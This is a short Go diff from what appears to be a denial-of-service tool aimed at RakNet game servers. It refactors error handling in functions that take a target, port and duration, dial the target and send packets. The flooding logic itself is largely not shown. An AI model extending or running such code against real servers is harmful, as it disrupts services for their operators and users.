@@ -13,6 +13,8 @@ import (
 
 func Raknet(target string, port string, duration string) {
 
+	defer Catch()
+
 	duration = strings.ReplaceAll(duration, "\x00", "")
 	duration = strings.ReplaceAll(duration, "\x03", "")
 	duration = strings.ReplaceAll(duration, "\r", "")
@@ -33,12 +35,7 @@ func Raknet(target string, port string, duration string) {
 
 func raknetConn(target string, port string) {
 
-	defer func() { // try catch
-		if er := recover(); er != nil {
-			fmt.Print(er)
-			return
-		}
-	}()
+	defer Catch()
 
 	conn, err := raknet.Dial(target + ":" + port)
 	if err != nil {
@@ -69,6 +66,8 @@ func raknetConn(target string, port string) {
 }
 
 func sendPacket(conn *raknet.Conn, mode string, size int) {
+
+	defer Catch()
 
 	var packet []byte
 	switch mode {
